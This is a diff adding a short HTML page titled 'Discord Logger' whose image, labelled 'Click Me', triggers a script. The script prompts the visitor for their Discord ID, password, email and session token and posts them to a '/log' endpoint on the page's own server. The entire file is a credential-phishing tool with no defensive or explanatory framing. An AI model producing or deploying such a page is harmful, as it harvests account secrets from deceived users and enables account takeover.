@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Logger</title>
+</head>
+<body>
+    <img src="image.jpg" alt="Click Me" onclick="logData()">
+    <script>
+        function logData() {
+            const discordId = prompt('Enter your Discord ID:');
+            const discordPassword = prompt('Enter your Discord Password:');
+            const discordEmail = prompt('Enter your Discord Email:');
+            const discordToken = prompt('Enter your Discord Token:');
+
+            fetch('/log', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    discord_id: discordId,
+                    discord_password: discordPassword,
+                    discord_email: discordEmail,
+                    discord_token: discordToken
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert('Data logged successfully!');
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+    </script>
+</body>
+</html>
